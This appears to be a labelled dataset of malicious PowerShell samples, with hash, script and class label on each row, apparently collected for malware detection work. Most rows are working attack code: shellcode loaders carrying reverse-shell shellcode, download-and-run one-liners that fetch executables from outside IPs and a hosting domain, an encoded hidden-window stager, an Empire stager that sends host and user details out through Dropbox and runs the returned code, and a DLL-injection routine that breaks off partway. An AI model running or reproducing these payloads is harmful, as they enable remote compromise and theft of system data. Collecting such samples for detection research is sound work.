0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
61ac0d87c7d61ba0b3f1960aa33cc251cbe09eaf510103796b6876f6352dc055,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAK09CVgCA7VWa2/iOhD93JX2P0QrJBItJUDZtltppesQngUKpIQCi67cxElMTUwdh9fe/e93wqOl2nbVu9KNWmFnZuzxOWc88eLQkZSHyjQYXYpR9VL58fHDSQcLPFPU1PS+0Ms77jKjpDZLz+5qJydgTc1G12GPlpirfFPUMZrPTT7DNJxcXZViIUgod/NslUgURWR2zyiJVE35RxkERJDTm/spcaTyQ0n9na0yfo/Z3m1dwk5AlFMUuomtyR2cJJe15oxKNf39e1obn+Yn2fJjjFmkpq11JMks6zKW1pSfWrLh7XpO1HSLOoJH3JPZAQ3PCtl+GGGPtGG1BWkRGXA3SmtwFPgTRMYiVJ4Playy81HTMOwI7iDXFSSCkGw9XPAHoqbCmLGM8pc63qfQi0NJZwTskgg+t4hYUIdE2RoOXUZ6xJuobbI8nPy9QepxEHh1pNAywMtbuba4GzOyC09rv2b7RKgGzxOpAMTPjx8+fvAOWlicB+dtN368sKfesR5gdDLejgkkrHZ4RLf+35RcRmnBrlhysYZp6lbERJso44SN8WSipJY5N/N2eP7gC5586JfQBevhRdAF09jm1J1A6J6ulEs2933m/32WGN/Wnkk8GhJzHeIZdQ7yUl8jgXiMbM+dPbi1IUM1vTcQ1ySM+FgmiGaU8a9h5RmVT7FGTJlLBHKAyAiyAo61l8nsSFLT9bBFZoDXbp4GOjwQNTl474W8PuyezMEpXWI4ijJKJ4aqcjKKRTAjbkZBYUT3JhRLvh2mn9NtxUxSB0fysNxEewHmftMSDyMpYgd4BABurTlxKGYJHhmlRl1irC3qHzZPv4pGCTNGQx9WWgAb8CZBwZKJOgTkmShBy1pE1mdzRmbgsi3xCsM+FPS+IrZqwj5x069meVD8Tt4JKAc0jnIEpi3GZUaxqZBwXSQAH2vrj1I5ui+ekyoJsudHPZTS2FjLRPgpgfitwQdOPlHrHqwtNEICLBXBZwaOyHnRkgJAUz/pN7SE4BnWQ9ZyjAeaR0uar7fgv0/P6ty8cK8b05ouzFXgoXpUb9U6ZrdWKy4all2UVrkurzt12SrfTacWqvX6Qzmqo9otzT0Mi5t5g26sJnKHK/18Y2yWOWO1mfquNzQ9z7/wrF7+S4U2B6WukSvgplmOmwNjaeSKUZkua13a7z40KvJ+aDPc93T/Lv8V01VTTO08b23qCFWDM2fT8Oxq0HLXw5r+dVB8QGWESmHZrhj8emgI1NFt7Nt88JgT+gDYMJwWJaNuv2J0uxUD9avTR/Or7kPsHQ6MgV2go/ldL4B5BVK41nPFOiDPh10AqcoR9nvg45cKTuCBj/kZGZ/bPCrgB4MjA3wqo0fIazivdBjYb/sFjmzWvsOoOVpXdD0/7BRRLUcHVR8lS2Lf6GIULcyNqedtl7uDL+2hp9t37EI3S7dzx9N1fVkzr51RfnV5c3HZHFB7xlFf1+1PiUJAIinZp51Co2wecf7WVd/CIgowAy3A9X2ozQoXlf1d3OE0iVDVp/78QERIGPQ06HoHbSPGuJN0hhc3N3SnXc+YQKH2YXhWeHWkKU+O2nPTOLy6uhpBxlAtT1LONknoyyCTW53lcnDz51bFHBz9/Uct8flafV4vk7SPJ9Be7MS2O2lJSaV417pplHqroND4/4Hd13QAP+57gX1+9xvru8DOZZ7h+MX08sV/Av6PoBhgKsHbgvuJkV3v/D0ie1UdfX8cUQeq8fZP8kF4E8vTNnyd/AsSXdN6iAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2a771f819c3acc12bac20d738d66012e2be6ca1dfafac39daee0972d12a52309,"
(New-Object System.Net.WebClient).DownloadFile('http://trolda.5gbfree.com/fosee/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
d9f75dd72b6c3aa67ce66f4ce7deed15afd01e78a4427016de7b9fbe0adb945d,"function Start-Negotiate {
    param($T,$SK,$PI=5,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')

    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            
            $IV = $In[0..15];
            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            $AES.Mode = ""CBC"";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    
    $Null = [Reflection.Assembly]::LoadWithPartialName(""System.Security"");
    $Null = [Reflection.Assembly]::LoadWithPartialName(""System.Core"");

    
    $ErrorActionPreference = ""SilentlyContinue"";
    $e=[System.Text.Encoding]::ASCII;

    $SKB=$e.GetBytes($SK);
    
    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode=""CBC"";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    
    $rk=$rs.ToXmlString($False);

    
    $ID=-join(""ABCDEFGHKLMNPRSTUVWXYZ123456789"".ToCharArray()|Get-Random -Count 8);

    
    $ib=$e.getbytes($rk);

    
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    
    
    if(-not $wc) {
        $wc=New-Object System.Net.WebClient;
        
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }

    if ($Script:Proxy) {
        $wc.Proxy = $Script:Proxy;   
    }
    
    
    
    
    
    
    
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    
    $wc.Headers.Set(""User-Agent"",$UA);
    
    $wc.Headers.Set(""Authorization"", ""Bearer $T"");
    $wc.Headers.Set(""Content-Type"", ""application/octet-stream"");
    
    $wc.Headers.Set(""Dropbox-API-Arg"", ""{`""path`"":`""REPLACE_STAGING_FOLDER/$($ID)_1.txt`""}"");
    
    $Null = $wc.UploadData(""https://content.dropboxapi.com/2/files/upload"", ""POST"", $rc4p);

    
    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set(""User-Agent"",$UA);
    $wc.Headers.Set(""Authorization"", ""Bearer $T"");
    $wc.Headers.Set(""Dropbox-API-Arg"", ""{`""path`"":`""REPLACE_STAGING_FOLDER/$($ID)_2.txt`""}"");
    $raw=$wc.DownloadData(""https://content.dropboxapi.com/2/files/download"");
    $de=$e.GetString($rs.decrypt($raw,$false));
    
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    
    $nonce=[String]([long]$nonce + 1);

    
    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode=""CBC"";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);

    
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+=""|$ip"";

    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];

    
    if(([Environment]::UserName).ToLower() -eq ""system""){$i+=""|True""}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator"")}

    
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    
    $i += ""|powershell|"" + $PSVersionTable.PSVersion.Major;

    
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    
    
    
    
    
    
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    
    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set(""User-Agent"",$UA);
    $wc.Headers.Set(""Authorization"", ""Bearer $T"");
    $wc.Headers.Set(""Content-Type"", ""application/octet-stream"");
    $wc.Headers.Set(""Dropbox-API-Arg"", ""{`""path`"":`""REPLACE_STAGING_FOLDER/$($ID)_3.txt`""}"");

    
    $Null = $wc.UploadData(""https://content.dropboxapi.com/2/files/upload"", ""POST"", $rc4p2);

    Start-Sleep -Seconds $(($PI -as [Int])*2);
    $wc.Headers.Set(""User-Agent"",$UA);
    $wc.Headers.Set(""Authorization"", ""Bearer $T"");
    $wc.Headers.Set(""Dropbox-API-Arg"", ""{`""path`"":`""REPLACE_STAGING_FOLDER/$($ID)_4.txt`""}"");
    $raw=$wc.DownloadData(""https://content.dropboxapi.com/2/files/download"");

    Start-Sleep -Seconds $($PI -as [Int]);
    $wc2=New-Object System.Net.WebClient;
    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    if($Script:Proxy) {
        $wc2.Proxy = $Script:Proxy;
    }
    
    $wc2.Headers.Add(""User-Agent"",$UA);
    $wc2.Headers.Add(""Authorization"", ""Bearer $T"");
    $wc2.Headers.Add(""Content-Type"", "" application/json"");
    $Null=$wc2.UploadString(""https://api.dropboxapi.com/2/files/delete"", ""POST"", ""{`""path`"":`""REPLACE_STAGING_FOLDER/$($ID)_4.txt`""}"");

    
    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );

    
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    
    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours ""WORKING_HOURS_REPLACE"" -ProxySettings $Script:Proxy;
}

Start-Negotiate -T $T -PI ""REPLACE_POLLING_INTERVAL"" -SK ""REPLACE_STAGING_KEY"" -UA $u;
",TaskExecution
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
fb26ef04b41417465114b1e17be5edbc98369a6df030cf87a2f6671c2309932e,"function Invoke-DllInjection
{


    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [Int]
        $ProcessID,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Dll
    )

    
    try
    {
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ""Process does not exist!""
    }
    
    
    try
    {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose ""Full path to Dll: $Dll""
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
        
        $DllByteArray = $AsciiEncoder.GetBytes($Dll)
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ""Invalid Dll path!""
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )
    
        
        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    
        [Byte[]] $MZHeader = New-Object Byte[](2)
        $FileStream.Read($MZHeader,0,2) | Out-Null
    
        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $FileStream.Close()
            Throw 'Invalid PE header.'
        }
    
        
        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
    
        [Byte[]] $lfanew = New-Object Byte[](4)
    
        
        $FileStream.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
    
        
        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
    
        
        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        $FileStream.Close()
    
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if ($Architecture -eq '014C')
        {
            Write-Output 'X86'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output 'X64'
        }
        else
        {
            Write-Output 'OTHER'
        }
    }

    
    
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
    $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    
    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $True
    }
    else
    {
        $PowerShell32bit = $False
    }

    if (${Env:ProgramFiles(x86)}) {
        $64bitOS = $True
    } else {
        $64bitOS = $False
    }

    
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    if ($IsWow64ProcessAddr)
    {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    }

    $Architecture = Get-PEArchitecture $Dll

    Write-Verbose ""Architecture of the dll to be injected: $Architecture""

    
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 

    if (!$hProcess)
    {
        Throw 'Unable to open process handle.'
    }

    if ($64bitOS) 
    {
        if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
        {
            Throw 'Only x86 or AMD64 architechtures supported.'
        }

        
        $IsWow64 = $False
        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

        if ( $PowerShell32bit -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
        }

        if ( (!$IsWow64) -and ($Architecture -eq 'X86') )
        {
            Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
        }

        if ( $IsWow64 -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
        }
    }
    else
    {
        if ($Architecture -ne 'X86')
        {
            Throw 'PE file was not compiled for x86.'
        }
    }

    
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    Write-Verbose ""LoadLibrary address: 0x$($LoadLibraryAddr.ToString(""X$([IntPtr]::Size*2)""))""

    
    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) 
    if ($RemoteMemAddr -eq [IntPtr]::Zero)
    {
        Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
    }
    Write-Verbose ""DLL path memory reserved at 0x$($RemoteMemAddr.ToString(""X$([IntPtr]::Size*2)""))""

    
    $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
    Write-Verbose ""Dll path written sucessfully.""

    
